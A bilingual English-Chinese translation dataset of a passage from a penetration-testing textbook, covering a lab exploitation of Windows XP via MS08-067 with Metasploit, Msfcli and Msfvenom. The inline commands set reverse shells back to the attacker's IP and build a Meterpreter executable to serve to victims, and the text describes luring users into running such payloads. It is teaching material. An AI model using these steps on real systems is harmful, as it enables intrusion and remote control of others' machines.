  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 有效负载（或 Shellcode）
- en: Based on the output of `show options` command, it looks like everything should
    be ready to go at this point, but we’re not quite done yet. We’ve forgotten to
    tell our exploit what to do once the target has been exploited. One of the ways
    that Metasploit makes things easier is by setting up our payloads for us. Metasploit
    has a plethora of payloads, ranging from simple Windows commands to the extensible
    Metasploit Meterpreter (see [Chapter 13](ch13.xhtml "Chapter 13. Post Exploitation")
    for more detailed information on Meterpreter). Just select a compatible payload,
    and Metasploit will craft your exploit string, including the code to trigger the
    vulnerability and the payload to run after exploitation is successful. (We’ll
    look at writing exploits by hand in [Chapter 16](ch16.xhtml "Chapter 16. A Stack-Based
    Buffer Overflow in Linux") through [Chapter 19](ch19.xhtml "Chapter 19. Fuzzing,
    Porting Exploits, and Metasploit Modules").)
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 根据`show options`命令的输出，目前看起来一切应该就绪，但我们还没有完全完成。我们忘记告诉我们的漏洞利用一旦目标被攻击成功后该做什么。Metasploit
    提供了便捷的方式来帮助我们设置有效负载。Metasploit 有许多有效负载，从简单的 Windows 命令到可扩展的 Metasploit Meterpreter（有关
    Meterpreter 的详细信息，请参见[第 13 章](ch13.xhtml "第 13 章. 后期利用")）。只需选择一个兼容的有效负载，Metasploit
    就会为你生成漏洞利用字符串，其中包括触发漏洞的代码和在漏洞利用成功后运行的有效负载。（我们将在[第 16 章](ch16.xhtml "第 16 章. Linux
    中的基于栈的缓冲区溢出")至[第 19 章](ch19.xhtml "第 19 章. 模糊测试、移植漏洞利用和 Metasploit 模块")中讨论手动编写漏洞利用。）
- en: Finding Compatible Payloads
  id: totrans-76
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 查找兼容的有效负载
- en: As of this writing there were 324 payloads in Metasploit, and like exploit modules,
    new payloads are added to the Framework regularly. For instance, as mobile platforms
    take over the world, payloads for iOS and other smartphones are starting to show
    up in Metasploit. But, of course, not all 324 payloads are compatible with our
    chosen exploit. Our Windows system will be a bit confused if it receives instructions
    that are meant for an iPhone. To see compatible payloads, enter **`show payloads`**,
    as shown in [Example 4-7](ch04.xhtml#compatible_payloads "Example 4-7. Compatible
    payloads").
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 截至目前，Metasploit 中有 324 个有效负载，像利用模块一样，新有效负载定期会被添加到框架中。例如，随着移动平台的崛起，iOS 和其他智能手机的有效负载开始出现在
    Metasploit 中。但当然，并非所有 324 个有效负载都与我们选择的漏洞利用兼容。如果我们的 Windows 系统收到本应为 iPhone 提供的指令，它会感到困惑。要查看兼容的有效负载，输入
    **`show payloads`**，如[示例 4-7](ch04.xhtml#compatible_payloads "示例 4-7. 兼容的有效负载")所示。
- en: Example 4-7. Compatible payloads
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-7. 兼容的有效负载
- en: '[PRE10]'
  id: totrans-79
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: If you forget to set a payload, you may find that, miraculously, the exploit
    module will just choose the default payload and associated settings and run it
    anyway. Still, you should get in the habit of manually setting a payload and its
    options because the default won’t always fit your needs.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你忘记设置有效载荷，你可能会发现，奇迹般地，攻击模块会自动选择默认的有效载荷及相关设置并运行。不过，你应该养成手动设置有效载荷及其选项的习惯，因为默认选项不一定适合你的需求。
- en: A Test Run
  id: totrans-81
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 测试运行
- en: Let’s keep things simple and send off our exploit with the default payload options
    first, just to see how things work. Enter **`exploit`** to tell Metasploit to
    run the module, as shown in [Example 4-8](ch04.xhtml#running_the_exploit "Example 4-8. Running
    the exploit").
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们保持简单，首先使用默认有效载荷选项发送攻击模块，以便查看其工作原理。输入 **`exploit`** 告诉 Metasploit 运行该模块，如[示例
    4-8](ch04.xhtml#running_the_exploit "示例 4-8. 运行攻击")所示。
- en: Example 4-8. Running the exploit
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-8. 运行攻击
- en: '[PRE11]'
  id: totrans-84
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: As you can see, we end up with a Meterpreter session. Meterpreter is short for
    *meta-interpreter*, Metasploit’s unique payload. I often describe it as a shell
    on steroids. It can do everything a command shell can do and much, much more.
    We’ll cover Meterpreter in depth in [Chapter 13](ch13.xhtml "Chapter 13. Post
    Exploitation"), but to get a head start, enter **`help`** in the Meterpreter console
    for a list of Meterpreter’s commands.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，我们最终得到了一个 Meterpreter 会话。Meterpreter 是 *meta-interpreter* 的缩写，是 Metasploit
    独有的有效载荷。我常常把它形容为“类 shell 的超级版本”。它可以做任何命令 shell 能做的事，甚至更多。我们将在[第 13 章](ch13.xhtml
    "第 13 章. 后期利用")深入讨论 Meterpreter，但为了提前了解，可以在 Meterpreter 控制台中输入 **`help`** 查看 Meterpreter
    的命令列表。
- en: Note
  id: totrans-86
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Another thing to note about the default options is that Metasploit uses the
    port 4444\. In our lab there is nothing wrong with this. It will work just fine.
    However, on real engagements, if your client is using even primitive intrusion-prevention
    software, it may take note of traffic on port 4444 and say, “Hey, you are Metasploit,
    go away!” and drop your connection.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个关于默认选项的注意事项是，Metasploit 使用端口 4444。在我们的实验室中，这没有问题，工作得很好。然而，在实际的攻击中，如果客户使用了即使是最原始的入侵防护软件，它可能会注意到端口
    4444 上的流量，并说：“嘿，你是 Metasploit，快走！”然后断开你的连接。
- en: For now, let’s close our Meterpreter session and learn more about selecting
    payloads manually. As useful as Meterpreter is, you may find yourself in situations
    where it is not the ideal payload to meet your needs. Type **`exit`** into your
    Meterpreter prompt to return to the regular Metasploit console.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们关闭 Meterpreter 会话，进一步了解如何手动选择有效载荷。尽管 Meterpreter 非常有用，但你可能会发现自己处于无法使用它的场景。输入
    **`exit`** 退出 Meterpreter 提示符，返回到常规的 Metasploit 控制台。
- en: '[PRE12]'
  id: totrans-89
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: Types of Shells
  id: totrans-90
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Shell 类型
- en: 'In the list of compatible payloads shown in [Example 4-7](ch04.xhtml#compatible_payloads
    "Example 4-7. Compatible payloads"), you see a range of options including command
    shells, Meterpreter, a speech API, or execution of a single Windows command. Meterpreter
    or otherwise, shells fall into two categories: bind and reverse.'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 在[示例 4-7](ch04.xhtml#compatible_payloads "示例 4-7. 兼容的有效载荷")中显示的兼容有效载荷列表中，你会看到一系列选项，包括命令
    shell、Meterpreter、语音 API 或执行单个 Windows 命令。不论是 Meterpreter 还是其他，shell 可以分为两类：绑定（bind）和反向（reverse）。
- en: Bind Shells
  id: totrans-92
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 绑定 Shell
- en: A *bind shell* instructs the target machine to open a command shell and listen
    on a local port. The attack machine then connects to the target machine on the
    listening port. However, with the advent of firewalls, the effectiveness of bind
    shells has fallen because any correctly configured firewall will block traffic
    to some random port like 4444.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '*绑定 shell* 指示目标机器打开一个命令 shell，并在本地端口上监听。然后，攻击机器连接到目标机器的监听端口。然而，随着防火墙的出现，绑定
    shell 的有效性下降，因为任何正确配置的防火墙都会阻止到一些随机端口（如 4444）的流量。'
- en: Reverse Shells
  id: totrans-94
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 反向 Shell
- en: A *reverse shell*, on the other hand, actively pushes a connection back to the
    attack machine rather than waiting for an incoming connection. In this case, on
    our attack machine we open a local port and listen for a connection from our target
    because this reverse connection is more likely to make it through a firewall.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '*反向 shell* 则相反，它主动将连接推回到攻击机器，而不是等待传入连接。在这种情况下，我们在攻击机器上打开一个本地端口并监听来自目标的连接，因为这种反向连接更有可能穿越防火墙。'
- en: Note
  id: totrans-96
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: You may be thinking, “Was this book written in 2002 or something? My firewall
    has egress filtering.” Modern firewalls allow you to stop outbound connections
    as well as inbound ones. It would be trivial to stop a host in your environment
    from connecting out, for instance, to port 4444\. But say I set up my listener
    on port 80 or port 443\. To a firewall, that will look like web traffic, and you
    know you have to let your users look at Facebook from their workstations or there
    would be mutiny and pandemonium on all sides.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会想，“这本书是2002年写的吗？我的防火墙有出站过滤。”现代防火墙不仅能阻止入站连接，还能阻止出站连接。例如，阻止你的环境中的主机连接到端口 4444
    是轻而易举的。但假设我把监听器设置在端口 80 或 443 上。对于防火墙来说，这看起来就像是网页流量，而你也知道，必须让用户能够从工作站访问 Facebook，否则会引发叛乱和混乱。
- en: Setting a Payload Manually
  id: totrans-98
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 手动设置有效载荷
- en: 'Let’s select a Windows reverse shell for our payload. Set a payload the same
    way you set the `RHOST` option: `set payload` *`<payload to use>`*.'
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们选择一个 Windows 反向 shell 作为有效载荷。设置有效载荷的方式与设置 `RHOST` 选项相同：`set payload` *`<使用的有效载荷>`*。
- en: '[PRE13]'
  id: totrans-100
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: Because this is a reverse shell, we need to tell the target where to send the
    shell; specifically, we need to give it the IP address of the attack machine and
    the port we will listen on. Running **`show options`** again, shown in [Example 4-9](ch04.xhtml#module_options_with_a_payload
    "Example 4-9. Module options with a payload"), displays the module as well as
    the payload options.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 由于这是一个反向 shell，我们需要告诉目标机器将 shell 发送到哪里；具体来说，我们需要提供攻击机器的 IP 地址和我们将监听的端口。再次运行
    **`show options`**，如 [示例 4-9](ch04.xhtml#module_options_with_a_payload "示例 4-9.
    带有效载荷的模块选项") 所示，将显示模块及其有效载荷选项。
- en: Example 4-9. Module options with a payload
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-9. 带有效载荷的模块选项
- en: '[PRE14]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: '`LHOST` ❶ is our local host on the Kali machine, the IP address we want our
    target machine to connect back to. To find the IP address (if you have forgotten
    it), enter the Linux **`ifconfig`** command directly into Msfconsole.'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: '`LHOST` ❶ 是我们在 Kali 机器上的本地主机，即我们希望目标机器连接回来的 IP 地址。如果你忘记了 IP 地址，可以直接在 Msfconsole
    中输入 Linux **`ifconfig`** 命令来查找。'
- en: '[PRE15]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: Now set the `LHOST` option with **`set LHOST 192.168.20.9`**. Leave the defaults
    for `LPORT`, for the local port to connect back to, as well as for `EXITFUNC`,
    which tells Metasploit how to exit. Now enter **`exploit`**, shown in [Example 4-10](ch04.xhtml#running_the_exploit-id00016
    "Example 4-10. Running the exploit"), to send our exploit off again, and wait
    for the shell to appear.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 现在设置 `LHOST` 选项，输入 **`set LHOST 192.168.20.9`**。保持 `LPORT` 和 `EXITFUNC` 的默认值，`LPORT`
    是连接回来的本地端口，`EXITFUNC` 指示 Metasploit 如何退出。然后输入 **`exploit`**，如 [示例 4-10](ch04.xhtml#running_the_exploit-id00016
    "示例 4-10. 运行利用代码") 所示，再次发送我们的利用代码，并等待 shell 出现。
- en: Example 4-10. Running the exploit
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-10. 运行利用代码
- en: '[PRE16]'
  id: totrans-108
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: 'Congratulations: You have successfully exploited your first machine!'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 恭喜你：你成功地利用了你的第一个机器！
- en: Here’s what happened. When we enter `exploit`, Metasploit opens a listener on
    port 4444 to catch the reverse shell from the target ❶. Then, since we kept the
    target as the default `Automatic Targeting`, Metasploit finger printed the remote
    SMB server and selected the appropriate exploit target for us ❷. Once it selected
    the exploit, Metasploit sent over the exploit string and attempted to take control
    of the target machine and execute our selected payload. Because the exploit succeeds,
    a command shell was caught by our handler.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 事情是这样的。当我们输入 `exploit` 时，Metasploit 在端口 4444 上打开一个监听器，以捕获来自目标 ❶ 的反向 shell。然后，由于我们将目标保持为默认的
    `Automatic Targeting`，Metasploit 会指纹识别远程 SMB 服务器，并为我们选择合适的利用目标 ❷。一旦选择了利用代码，Metasploit
    就会发送利用字符串，并尝试控制目标机器并执行我们选择的有效载荷。由于利用成功，命令 shell 被我们的处理程序捕获。
- en: To close this shell, type ctrl-C and enter **`y`** at the prompt to abort the
    session.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 要关闭这个 shell，按 ctrl-C，然后在提示符下输入 **`y`** 来中止会话。
- en: '[PRE17]'
  id: totrans-112
  prefs: []
  type: TYPE_PRE
  zh: '[PRE17]'
- en: To return to a Meterpreter shell, you can choose a payload with Meterpreter
    in the name such as *windows/meterpreter/reverse_tcp* and exploit the Windows
    XP target again.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 要返回到 Meterpreter shell，您可以选择一个名称中带有 Meterpreter 的有效载荷，如 *windows/meterpreter/reverse_tcp*，然后再次利用
    Windows XP 目标。
- en: Msfcli
  id: totrans-114
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Msfcli
- en: 'Now for another way to interact with Metasploit: the command line interface,
    Msfcli. Msfcli is particularly useful when using Metasploit inside scripts and
    for testing Metasploit modules that you’re developing because it lets you run
    a module with a quick, one-line command.'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 现在介绍另一种与 Metasploit 交互的方法：命令行接口 Msfcli。当在脚本中使用 Metasploit 或测试正在开发的 Metasploit
    模块时，Msfcli 特别有用，因为它允许你用简单的一行命令运行模块。
- en: Getting Help
  id: totrans-116
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 获取帮助
- en: To run Msfcli, first exit Msfconsole by entering `exit`, or just open another
    Linux console. Msfcli is in our path, so we can call it from anywhere. Let’s begin
    by looking at the help menu for Msfcli with **`msfcli -h`** ([Example 4-11](ch04.xhtml#msfcli_help
    "Example 4-11. Msfcli help")).
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 要运行Msfcli，首先通过输入`exit`退出Msfconsole，或直接打开另一个Linux控制台。Msfcli已经在我们的路径中，因此我们可以在任何地方调用它。让我们首先通过**`msfcli
    -h`**查看Msfcli的帮助菜单（如[示例 4-11](ch04.xhtml#msfcli_help "示例 4-11. Msfcli帮助")所示）。
- en: Example 4-11. Msfcli help
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-11. Msfcli帮助
- en: '[PRE18]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE18]'
- en: Unlike with Msfconsole, when using Msfcli, we can tell Metasploit everything
    it needs to know to run our exploit in just one command ❶. Luckily, Msfcli has
    some modes to help us build the final command. For example, the `O` mode ❷ shows
    the selected module’s options, and `P` shows the compatible payloads ❸.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 与使用Msfconsole不同，在使用Msfcli时，我们可以通过一个命令❶告诉Metasploit执行漏洞所需的一切。幸运的是，Msfcli有一些模式来帮助我们构建最终的命令。例如，`O`模式❷显示所选模块的选项，而`P`模式则显示兼容的有效载荷❸。
- en: Showing Options
  id: totrans-121
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 显示选项
- en: Let’s use our MS08-067 exploit against our Windows XP target again. According
    to the help page, we need to pass Msfcli the exploit name we want to use and set
    all our options ❶. To show the available options use the `O` mode. Enter **`msfcli
    windows/smb/ms08_067_netapi O`** to see the options for the MS08-067 exploit module,
    as shown in [Example 4-12](ch04.xhtml#module_options "Example 4-12. Module options").
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们再次对Windows XP目标使用MS08-067漏洞。根据帮助页面，我们需要传递给Msfcli我们想要使用的漏洞名称并设置所有选项❶。要查看可用的选项，请使用`O`模式。输入**`msfcli
    windows/smb/ms08_067_netapi O`**以查看MS08-067漏洞模块的选项，如[示例 4-12](ch04.xhtml#module_options
    "示例 4-12. 模块选项")所示。
- en: Example 4-12. Module options
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-12. 模块选项
- en: '[PRE19]'
  id: totrans-124
  prefs: []
  type: TYPE_PRE
  zh: '[PRE19]'
- en: We see the same options as we did in Msfconsole. We’re reminded to set the `RHOST`
    option to the IP address of the target machine, but as we saw on the help page,
    setting options in Msfcli is a little different from doing do in Msfconsole. Here
    we say *`option=value`*. For example, to set `RHOST`, we enter `RHOST=192.168.20.10`.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 我们看到与Msfconsole中相同的选项。我们被提醒将`RHOST`选项设置为目标机器的IP地址，但正如我们在帮助页面上看到的，在Msfcli中设置选项与在Msfconsole中稍有不同。这里我们使用*`option=value`*的方式。例如，要设置`RHOST`，我们输入`RHOST=192.168.20.10`。
- en: Payloads
  id: totrans-126
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 有效载荷
- en: For a reminder of the payloads compatible with this module, use the `P` mode.
    Try **`msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P`**, as shown in
    [Example 4-13](ch04.xhtml#module_payloads_in_msfcli "Example 4-13. Module payloads
    in Msfcli").
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 若要查看与此模块兼容的有效载荷，请使用`P`模式。尝试**`msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10
    P`**，如[示例 4-13](ch04.xhtml#module_payloads_in_msfcli "示例 4-13. Msfcli中的模块有效载荷")所示。
- en: Example 4-13. Module payloads in Msfcli
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-13. Msfcli中的模块有效载荷
- en: '[PRE20]'
  id: totrans-129
  prefs: []
  type: TYPE_PRE
  zh: '[PRE20]'
- en: This time, we’ll use a bind shell payload. Recall that a bind shell just listens
    on a local port on the target machine. It will be up to our attack machine to
    connect to the target machine after the payload has run. Recall from our work
    in Msfconsole that choosing a payload requires additional payload-specific options,
    which we can view again with the `O` flag.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 这次，我们将使用绑定shell有效载荷。回想一下，绑定shell只是在目标机器的本地端口上监听。在有效载荷执行后，由我们的攻击机器连接到目标机器。回想我们在Msfconsole中的工作，选择一个有效载荷需要额外的有效载荷特定选项，我们可以通过`O`标志再次查看。
- en: Because our bind shell won’t be calling back to our attack machine, we don’t
    need to set the `LHOST` option, and we can leave the `LPORT` option as the default
    of 4444 for now. It looks like we have everything we need to exploit the Windows
    XP target again. Finally, to tell Msfcli to run the exploit we use the `E` flag
    ([Example 4-14](ch04.xhtml#running_the_exploit_in_msfcli "Example 4-14. Running
    the exploit in Msfcli")).
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 因为我们的绑定shell不会回调到攻击机器，所以我们不需要设置`LHOST`选项，并且可以暂时将`LPORT`选项保持为默认的4444。看起来我们已经准备好再次利用Windows
    XP目标。最后，要告诉Msfcli运行漏洞，我们使用`E`标志（如[示例 4-14](ch04.xhtml#running_the_exploit_in_msfcli
    "示例 4-14. 在Msfcli中运行漏洞")所示）。
- en: Example 4-14. Running the exploit in Msfcli
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-14. 在Msfcli中运行漏洞
- en: '[PRE21]'
  id: totrans-133
  prefs: []
  type: TYPE_PRE
  zh: '[PRE21]'
- en: It looks like everything worked, and we got another shell. But this time, instead
    of starting a reverse handler listening on the specified local port of 4444, Metasploit
    starts a handler for the bind shell ❶. After Metasploit sends over the exploit
    string, the bind handler will automatically connect out to the port specified
    by the payload and connect to the shell. Once again, we have taken control of
    the target machine.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 看起来一切正常，我们得到了另一个shell。但这次，与其在指定的本地端口4444上启动反向处理程序，Metasploit启动了一个用于绑定shell的处理程序❶。在Metasploit发送漏洞字符串后，绑定处理程序将自动连接到有效载荷指定的端口并连接到shell。再次，我们已成功控制目标机器。
- en: Creating Standalone Payloads with Msfvenom
  id: totrans-135
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Msfvenom创建独立的有效载荷
- en: In 2011, Msfvenom was added to Metasploit. Prior to Msfvenom, the tools Msfpayload
    and Msfencode could be used together to create standalone encoded Metasploit payloads
    in a variety of output formats, such as Windows executables and ASP pages. With
    the introduction of Msfvenom, the functionality of Msfpayload and Msfencode was
    combined into a single tool, though Msfpayload and Msfencode are still included
    in Metasploit. To view Msfvenom’s help page, enter **`msfvenom -h`**.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 在2011年，Msfvenom被添加到Metasploit中。在Msfvenom之前，工具Msfpayload和Msfencode可以一起使用，创建多种输出格式的独立编码Metasploit有效载荷，如Windows可执行文件和ASP页面。随着Msfvenom的推出，Msfpayload和Msfencode的功能合并到了一个工具中，尽管Msfpayload和Msfencode仍然包含在Metasploit中。要查看Msfvenom的帮助页面，请输入**`msfvenom
    -h`**。
- en: 'So far with Metasploit, our goal has been to exploit a vulnerability on the
    target system and take control of the machine. Now we’ll do something a little
    different. Instead of relying on a missing patch or other security issue, we are
    hoping to exploit the one security issue that may never be fully patched: the
    users. Msfvenom allows you to build standalone payloads to run on a target system
    in an attempt to exploit the user whether through a social-engineering attack
    ([Chapter 11](ch11.xhtml "Chapter 11. Social Engineering")) or by uploading a
    payload to a vulnerable server, as we’ll see in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation").
    When all else fails, the user can often be a way in.'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，使用Metasploit的目标一直是利用目标系统中的漏洞并控制机器。现在我们将做些不同的事情。我们不再依赖缺失的补丁或其他安全问题，而是希望利用一个可能永远无法完全修复的安全问题：用户。Msfvenom允许你创建独立的有效载荷，在目标系统上运行，试图通过社会工程学攻击（[第11章](ch11.xhtml
    "第11章. 社会工程学")）或通过将有效载荷上传到一个易受攻击的服务器来利用用户，正如我们将在[第8章](ch08.xhtml "第8章. 利用")中看到的那样。当一切都失败时，用户通常是一个突破口。
- en: Choosing a Payload
  id: totrans-138
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 选择有效载荷
- en: To list all the available payloads, enter **`msfvenom -l payloads`**. We’ll
    use one of Metasploit’s Meterpreter payloads, `windows/meterpreter/reverse_tcp`,
    which provides a reverse connection with a Meterpreter shell. Use `-p` to select
    a payload.
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 要列出所有可用的有效载荷，请输入**`msfvenom -l payloads`**。我们将使用Metasploit的Meterpreter有效载荷之一，`windows/meterpreter/reverse_tcp`，它提供一个带有Meterpreter
    shell的反向连接。使用`-p`来选择一个有效载荷。
- en: Setting Options
  id: totrans-140
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 设置选项
- en: To see the correct options to use for a module, enter the `-o` flag after selecting
    a payload, as shown in [Example 4-15](ch04.xhtml#options_in_msfvenom "Example 4-15. Options
    in Msfvenom").
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 要查看模块的正确选项，请在选择有效载荷后输入`-o`标志，如[示例4-15](ch04.xhtml#options_in_msfvenom "示例4-15.
    Msfvenom中的选项")所示。
- en: Example 4-15. Options in Msfvenom
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 示例4-15. Msfvenom中的选项
- en: '[PRE22]'
  id: totrans-143
  prefs: []
  type: TYPE_PRE
  zh: '[PRE22]'
- en: As expected, our `LHOST` needs to be set, and our `LPORT` is set to the default
    4444\. For practice, set `LPORT` to 12345 by entering **`LPORT=12345`**. We also
    see `EXITFUNC`, which we can leave as the default. Because this is a reverse connection
    payload, we need to set our `LHOST` option to tell the target machine where to
    connect back to (our Kali machine).
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 正如预期的那样，我们需要设置`LHOST`，并且`LPORT`默认为4444。为了练习，将`LPORT`设置为12345，输入**`LPORT=12345`**。我们还看到`EXITFUNC`，可以将其保留为默认设置。由于这是一个反向连接有效载荷，我们需要设置`LHOST`选项，告诉目标机器连接回我们的Kali机器。
- en: Choosing an Output Format
  id: totrans-145
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 选择输出格式
- en: Now tell Msfvenom which output format to use. Will we be running this payload
    from a Windows executable, or do we want to make an ASP file that can be uploaded
    to a web server we have gained write access to? To see all available output formats,
    enter **`msfvenom --help-formats`**.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 现在告诉Msfvenom使用哪个输出格式。我们是要从Windows可执行文件运行这个有效载荷，还是要制作一个可以上传到我们已经获得写入权限的Web服务器的ASP文件？要查看所有可用的输出格式，请输入**`msfvenom
    --help-formats`**。
- en: '[PRE23]'
  id: totrans-147
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'To select the output format, use the `-f` option along with the chosen format:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 要选择输出格式，请使用`-f`选项并选择所需的格式：
- en: '[PRE24]'
  id: totrans-149
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: But if you run this command as is, you’ll see garbage printed to the console.
    While this is technically our executable payload, it doesn’t do us much good.
    Instead, let’s redirect the output to an executable file, *chapter4example.exe*.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 但是，如果你按原样运行这个命令，你会看到控制台输出垃圾信息。虽然这在技术上是我们的可执行有效载荷，但它对我们没有什么帮助。相反，我们将输出重定向到一个可执行文件，*chapter4example.exe*。
- en: '[PRE25]'
  id: totrans-151
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: There is no output to the screen, but if we run the `file` command on our newly
    created executable file, we see that it’s a Windows executable that will run on
    *any* Windows system as long as a user attempts to run it. (Later, in [Chapter 12](ch12.xhtml
    "Chapter 12. Bypassing Antivirus Applications"), we’ll see cases where antivirus
    applications stop a Metasploit payload and learn ways we can obfuscate our standalone
    payloads to bypass antivirus programs. Also, we will cover clever ways to lure
    users into downloading and running malicious payloads in [Chapter 11](ch11.xhtml
    "Chapter 11. Social Engineering").)
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 屏幕上没有输出，但如果我们在新创建的可执行文件上运行 `file` 命令，我们会看到它是一个 Windows 可执行文件，只要用户尝试运行它，它将在 *任何*
    Windows 系统上运行。（稍后，在 [第12章](ch12.xhtml "第12章：绕过杀毒软件应用")中，我们将看到杀毒软件应用如何阻止 Metasploit
    有效载荷，并学习如何将我们的独立有效载荷混淆以绕过杀毒程序。此外，我们还将在 [第11章](ch11.xhtml "第11章：社会工程学")中讨论一些巧妙的方法来引诱用户下载并运行恶意有效载荷。）
- en: Serving Payloads
  id: totrans-153
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 投放有效载荷
- en: One good way to serve up payloads is to host them on a web server, disguise
    them as something useful, and lure users into downloading them. For this example,
    we’ll host our Metasploit executable on our Kali machine’s builtin Apache server
    and browse to the file from our target machine.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 一种有效的投放有效载荷的好方法是将其托管在 Web 服务器上，将其伪装成有用的东西，并引诱用户下载。对于这个示例，我们将在 Kali 机器的内建 Apache
    服务器上托管我们的 Metasploit 可执行文件，然后从目标机器浏览该文件。
- en: First, run **`cp chapter4example.exe /var/www`** to copy the payload executable
    to the Apache directory, and then make sure the web server is started with **`service
    apache2 start`**.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，运行 **`cp chapter4example.exe /var/www`** 将有效载荷可执行文件复制到 Apache 目录，然后确保通过 **`service
    apache2 start`** 启动 Web 服务器。
- en: '[PRE26]'
  id: totrans-156
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: Now switch to your Windows XP target and open Internet Explorer. Browse to *[http://192.168.20.9/chapter4example.exe](http://192.168.20.9/chapter4example.exe)*
    and download the file. But before we run the file, we have one loose end to deal
    with.
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 现在切换到你的 Windows XP 目标并打开 Internet Explorer。浏览到 *[http://192.168.20.9/chapter4example.exe](http://192.168.20.9/chapter4example.exe)*
    并下载该文件。但在运行文件之前，我们还有一个未完成的步骤。
- en: So far when attempting to exploit our target machine, Metasploit set up our
    payload handlers and sent the exploit. When we used Msfconsole to exploit the
    MS08-067 vulnerability with a reverse shell payload, Metasploit first set up a
    handler listening on port 4444 for the reverse connection, but up to this point
    we have nothing listening for a reverse connection from the payload we created
    with Msfvenom.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
